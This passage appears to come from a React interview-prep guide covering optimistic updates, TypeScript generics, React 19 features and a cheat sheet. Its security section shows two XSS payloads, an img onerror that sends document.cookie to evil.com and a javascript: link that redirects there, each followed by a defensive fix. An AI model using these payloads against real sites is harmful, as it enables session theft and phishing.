        isLiked: true,
      }));

      return { previousTweet }; // context for rollback
    },

    onError: (err, tweetId, context) => {
      // API call failed → roll back to previous state
      queryClient.setQueryData(['tweet', tweetId], context.previousTweet);
      showToast('Failed to like tweet. Try again.');
    },

    onSettled: (data, err, tweetId) => {
      // Always sync with server (whether success or error)
      queryClient.invalidateQueries({ queryKey: ['tweet', tweetId] });
    },
  });

  USE OPTIMISTIC:   like/unlike, follow/unfollow, reorder, toggle
  NEVER OPTIMISTIC: payments, send money, delete account, publish post
                    (irreversible or has server-side validation)
```

---

## 11. TypeScript + React

**Q: "How do you type a generic reusable component in TypeScript?"**

---

**HOW TO SAY IT:**

> "The most powerful TypeScript pattern I use in React is the generic component.
> It lets type information flow through the component without you having to
> specify it at every call site. I'll show with a real example — a reusable
> table component that works for users, orders, products, anything."

```
REAL APP: Reusable Data Table (works for any entity type)

  // WITHOUT GENERICS — you'd need separate tables:
  function UserTable({ users }: { users: User[] }) { ... }
  function OrderTable({ orders }: { orders: Order[] }) { ... }
  function ProductTable({ products }: { products: Product[] }) { ... }
  // 3x code duplication

  // WITH GENERICS — one table, TypeScript enforces correctness:
  interface Column<T> {
    header: string;
    accessor: keyof T;                    // must be a key of T
    render?: (value: T[keyof T]) => React.ReactNode;
  }

  interface DataTableProps<T> {
    data: T[];
    columns: Column<T>[];
    keyExtractor: (item: T) => string;
    onRowClick?: (item: T) => void;
  }

  function DataTable<T>({
    data,
    columns,
    keyExtractor,
    onRowClick,
  }: DataTableProps<T>) {
    return (
      <table>
        <thead>
          <tr>{columns.map(col => <th key={col.header}>{col.header}</th>)}</tr>
        </thead>
        <tbody>
          {data.map(item => (
            <tr key={keyExtractor(item)} onClick={() => onRowClick?.(item)}>
              {columns.map(col => (
                <td key={String(col.accessor)}>
                  {col.render
                    ? col.render(item[col.accessor])
                    : String(item[col.accessor])}
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    );
  }

  // USAGE — TypeScript infers T = User automatically:
  <DataTable
    data={users}
    keyExtractor={u => u.id}
    columns={[
      { header: 'Name', accessor: 'name' },          // ✅ 'name' is keyof User
      { header: 'Email', accessor: 'email' },         // ✅
      { header: 'Role', accessor: 'role',
        render: (role) => <RoleBadge role={role} /> },
      { header: 'xyz', accessor: 'nonExistent' },     // ❌ TS error immediately
    ]}
  />
```

```
POLYMORPHIC COMPONENT ("as" prop):

  // Design system need: <Text> that renders as h1, h2, p, span, label
  // depending on usage context

  type PolymorphicProps<C extends React.ElementType> = {
    as?: C;
    children: React.ReactNode;
    className?: string;
  } & Omit<React.ComponentPropsWithoutRef<C>, 'as' | 'children'>;

  function Text<C extends React.ElementType = 'p'>({
    as,
    children,
    ...props
  }: PolymorphicProps<C>) {
    const Component = as ?? 'p';
    return <Component {...props}>{children}</Component>;
  }

  // TypeScript enforces correct props per HTML element:
  <Text as="h1">Page Title</Text>              // h1 props ✅
  <Text as="a" href="/about">About</Text>      // anchor + href ✅
  <Text as="button" onClick={fn}>Click</Text>  // button + onClick ✅
  <Text as="button" href="/x">broken</Text>    // href on button → TS error ❌
```

---

## 12. Security in React

**Q: "What React-specific security vulnerabilities do you look for in code reviews?"**

---

**HOW TO SAY IT:**

> "React handles most XSS by default — JSX escapes everything rendered as text.
> The vulnerabilities I watch for are the places where you explicitly opt out
> of that protection. In a CMS or blog platform where users write rich content,
> these come up constantly. Let me go through each attack surface..."

```
REAL APP: CMS Blog Platform — Security Review Checklist

  VULNERABILITY 1: dangerouslySetInnerHTML without sanitization
  ─────────────────────────────────────────────────────────────
  // Editor saves rich text as HTML, we render it:

  // VULNERABLE:
  <div dangerouslySetInnerHTML={{ __html: post.content }} />

  // ATTACK: Malicious editor saves:
  post.content = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'
                  +document.cookie)">'
  // When rendered: browser loads the img, it fails, executes onerror
  // Attacker receives: session cookie, auth token, everything

  // FIX: DOMPurify sanitizes before render
  import DOMPurify from 'dompurify';
  <div dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(post.content, {
      ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'a'],
      ALLOWED_ATTR: ['href', 'title'],
      FORCE_HTTPS: true,         // convert http:// links to https://
    })
  }} />

  ──────────────────────────────────────────────────────────────

  VULNERABILITY 2: href injection (javascript: protocol)
  ──────────────────────────────────────────────────────
  // User profiles have a website link field:
  // VULNERABLE:
  <a href={user.website}>Visit website</a>

  // ATTACK: User sets website = 'javascript:document.location="https://evil.com/phish"'
  // User clicks "Visit website" → gets phished

  // FIX:
  function SafeLink({ href, children }) {
    const isSafe = /^https?:\/\//i.test(href);
    return (
      <a
        href={isSafe ? href : '#'}
        rel="noopener noreferrer"   // prevent opener access
        target="_blank"
      >
        {children}
      </a>
    );
  }

  ──────────────────────────────────────────────────────────────

  VULNERABILITY 3: Auth token storage
  ─────────────────────────────────────
  // VULNERABLE: localStorage accessible by any JS on the page
  localStorage.setItem('refreshToken', token);
  // If any dependency has XSS → attacker reads token → full account access

  // FIX: HTTP-only cookie (set by server)
  // Server sets: Set-Cookie: refreshToken=xyz; HttpOnly; Secure; SameSite=Strict
  // JavaScript literally cannot read HttpOnly cookies
  // XSS attack cannot steal what JS can't read
```

---

## 13. React 19

**Q: "What's new in React 19 and where would you actually use it?"**

---

**HOW TO SAY IT:**

> "React 19 is really about removing boilerplate from patterns that were
> already proven. The two things I'm most excited about are use() and
> Server Actions — they eliminate the awkward useEffect-for-fetching pattern
> and the need for separate API route files for simple mutations."

```
REAL APP: Todo Application — Before vs After React 19

  BEFORE React 19 — data fetching pattern:
  ──────────────────────────────────────────
  function TodoList() {
    const [todos, setTodos] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);

    useEffect(() => {
      fetch('/api/todos')
        .then(r => r.json())
        .then(data => { setTodos(data); setLoading(false); })
        .catch(err => { setError(err); setLoading(false); });
    }, []);

    if (loading) return <Spinner />;
    if (error) return <Error />;
    return <ul>{todos.map(t => <li key={t.id}>{t.text}</li>)}</ul>;
  }
  // 15 lines just to fetch data

  AFTER React 19 — use() hook:
  ─────────────────────────────
  // Create the promise OUTSIDE the component (stable reference)
  const todosPromise = fetch('/api/todos').then(r => r.json());

  function TodoList() {
    const todos = use(todosPromise);
    // use() suspends if promise is pending
    // throws to ErrorBoundary if rejected
    // returns data if resolved
    return <ul>{todos.map(t => <li key={t.id}>{t.text}</li>)}</ul>;
  }
  // Wrap in Suspense + ErrorBoundary (instead of loading/error state):
  <ErrorBoundary fallback={<Error />}>
    <Suspense fallback={<Spinner />}>
      <TodoList />
    </Suspense>
  </ErrorBoundary>
  // 3 lines in the component, loading/error handled declaratively
```

```
  SERVER ACTIONS — eliminate the API route file:
  ───────────────────────────────────────────────
  // BEFORE: Need an API route + a fetch call + error handling
  // pages/api/todos.ts:
  export default async function handler(req, res) {
    if (req.method === 'POST') {
      await db.todos.create({ text: req.body.text });
      res.json({ success: true });
    }
  }
  // Component:
  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch('/api/todos', { method: 'POST', body: JSON.stringify(...) });
    router.refresh();
  };

  // AFTER React 19 Server Actions:
  // actions.ts
  'use server';
  export async function createTodo(formData: FormData) {
    const text = formData.get('text') as string;
    await db.todos.create({ text });
    revalidatePath('/todos');  // refresh the page data
  }

  // Component — no useEffect, no fetch, no API route needed:
  <form action={createTodo}>
    <input name="text" placeholder="Add todo..." />
    <SubmitButton />   {/* uses useFormStatus for pending state */}
  </form>

  // SubmitButton:
  function SubmitButton() {
    const { pending } = useFormStatus(); // knows parent form is submitting
    return <button disabled={pending}>{pending ? 'Adding...' : 'Add'}</button>;
  }
```

```
  useOptimistic — replaces verbose onMutate pattern:
  ────────────────────────────────────────────────────
  // BEFORE (React Query onMutate pattern — 20+ lines)
  // AFTER (React 19 useOptimistic — 5 lines):

  function Todos({ todos }) {
    const [optimisticTodos, addOptimisticTodo] = useOptimistic(
      todos,
      (state, newTodo) => [...state, { ...newTodo, sending: true }]
    );

    async function formAction(formData) {
      const newTodo = { text: formData.get('text'), id: Date.now() };
      addOptimisticTodo(newTodo);  // UI updates INSTANTLY
      await createTodo(formData);  // server action runs in background
      // On success: useOptimistic reverts and shows real server data
      // On failure: useOptimistic reverts to original todos
    }

    return (
      <>
        <ul>
          {optimisticTodos.map(todo => (
            <li key={todo.id} style={{ opacity: todo.sending ? 0.5 : 1 }}>
              {todo.text} {todo.sending && '(saving...)'}
            </li>
          ))}
        </ul>
        <form action={formAction}>
          <input name="text" /><button>Add</button>
        </form>
      </>
    );
  }
```

---

## 15. Senior Trap Questions

**Q: "When would you NOT use React?"**

---

**WEAK answer:** *"React is great for everything, I'd always use it."*

**STRONG answer (what to say):**

> "This is a question I genuinely think about at the start of a project.
> React is the right default for most web apps, but not all. Here are the
> cases where I'd reach for something else:
>
> A pure content/marketing site — Astro. Zero JavaScript by default,
> ships HTML, great Core Web Vitals out of the box. I've seen teams
> spend weeks optimizing a React marketing site's LCP that would have
> been fast by default in Astro.
>
> A real-time collaborative tool — Figma-style — where hundreds of updates
> per second come through WebSockets. React's virtual DOM diffing adds
> overhead on every update. SolidJS with fine-grained reactivity would
> be better there — updates bypass the virtual DOM entirely.
>
> A small embeddable widget that gets dropped into non-React host pages —
> Web Components. No framework coupling, works in Angular, Vue, plain HTML.
>
> React is still my default for dashboards, SPAs, server-rendered apps,
> e-commerce, anything with complex interactive UI."

---

**Q: "What is the stale closure problem?"**

---

**STRONG answer with example:**

```
REAL APP: Live Chat — Message counter that broke in production

  // The bug: online user count showed "1" forever in the window title
  useEffect(() => {
    const interval = setInterval(() => {
      document.title = `(${onlineCount}) New messages`;
      // onlineCount is FROZEN at its value when this effect ran
    }, 1000);
    return () => clearInterval(interval);
  }, []); // empty deps = closure captures onlineCount=1 at mount, NEVER UPDATES

  WHAT HAPPENS:
  ┌──────────────────────────────────────────────────────┐
  │  Component mounts: onlineCount = 1                    │
  │  Closure captures: onlineCount = 1  (frozen snapshot) │
  │                                                        │
  │  t=5s:  onlineCount updates to 47 (WebSocket event)   │
  │         Interval still runs with onlineCount = 1 ❌   │
  │                                                        │
  │  t=10s: onlineCount updates to 52                      │
  │         Interval still runs with onlineCount = 1 ❌   │
  │  Title always shows "(1) New messages" — stale!        │
  └──────────────────────────────────────────────────────┘

  FIX 1: Use a ref (doesn't trigger re-render, always fresh):
  ─────────────────────────────────────────────────────────
  const countRef = useRef(onlineCount);
  useEffect(() => {
    countRef.current = onlineCount; // update ref on every render
  });
  useEffect(() => {
    const interval = setInterval(() => {
      document.title = `(${countRef.current}) New messages`; // always fresh
    }, 1000);
    return () => clearInterval(interval);
  }, []); // empty deps OK now — reads from ref, not closure

  FIX 2: Include in deps (creates new interval on change):
  ─────────────────────────────────────────────────────────
  useEffect(() => {
    const interval = setInterval(() => {
      document.title = `(${onlineCount}) New messages`;
    }, 1000);
    return () => clearInterval(interval);
  }, [onlineCount]); // new interval whenever count changes
  // OK here — interval is cheap to recreate

  FIX 3: Functional update (for setState specifically):
  ─────────────────────────────────────────────────────
  // setCount(count + 1) ← stale closure problem
  // setCount(prev => prev + 1) ← reads CURRENT state, not closure
```

---

## One-Page Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════════╗
║  INTERNALS                                                           ║
║  Fiber = linked list of work units. Can pause between nodes.         ║
║  Render phase = interruptible diff. Commit = atomic DOM write.       ║
╠══════════════════════════════════════════════════════════════════════╣
║  CONCURRENT MODE                                                     ║
║  startTransition → non-urgent setState (typing search filter)        ║
║  useTransition   → same + isPending for loading UI                   ║
║  useDeferredValue → lag a value received as prop                     ║
╠══════════════════════════════════════════════════════════════════════╣
║  SERVER COMPONENTS                                                   ║
║  Server = no JS shipped, async by default, direct DB                 ║
║  Client = 'use client', has hooks/events                             ║
║  Server CAN hold Client children. Client CANNOT import Server.       ║
╠══════════════════════════════════════════════════════════════════════╣
║  STATE CATEGORIES                                                    ║
║  Server state → React Query   (cache, refetch, invalidate)           ║
║  Global UI    → Zustand/RTK   (sidebar, user, theme)                 ║
║  URL state    → Search params (filter, sort, page — survives refresh)║
║  Form state   → React Hook Form (uncontrolled, fast)                 ║
║  Local state  → useState (keep it where it's used)                   ║
╠══════════════════════════════════════════════════════════════════════╣
║  PERFORMANCE RULES                                                   ║
║  1. Profile first (DevTools Profiler, Chrome Perf)                   ║
║  2. Virtualize large lists (react-window, @tanstack/virtual)         ║
║  3. React.memo on expensive child components                         ║
║  4. useCallback only if passed to memo child or in effect deps       ║
║  5. Split context by update frequency                                ║
╠══════════════════════════════════════════════════════════════════════╣
║  PATTERNS                                                            ║
║  Compound Components → design system (Tabs, Select, Modal)           ║
║  Render Props       → renderItem in lists/tables (react-window)      ║
║  HOC                → cross-cutting at route level (auth, analytics) ║
║  Custom Hook        → logic sharing in new code (preferred)          ║
╠══════════════════════════════════════════════════════════════════════╣
║  SECURITY                                                            ║
║  DOMPurify before dangerouslySetInnerHTML                            ║
║  Validate href protocols (block javascript:)                         ║
║  Refresh tokens → HTTP-only cookie, NEVER localStorage               ║
╠══════════════════════════════════════════════════════════════════════╣
║  STALE CLOSURE                                                       ║
║  setCount(prev => prev + 1) — not setCount(count + 1) in intervals   ║
║  useRef for mutable latest values read inside effects                ║
╠══════════════════════════════════════════════════════════════════════╣
║  REACT 19                                                            ║
║  use(promise) → suspends if pending, throws to ErrorBoundary         ║
║  Server Actions → 'use server' fn, no API route needed               ║
║  useOptimistic → instant UI + auto rollback on failure               ║
║  ref as prop → forwardRef no longer needed                           ║
╚══════════════════════════════════════════════════════════════════════╝
```
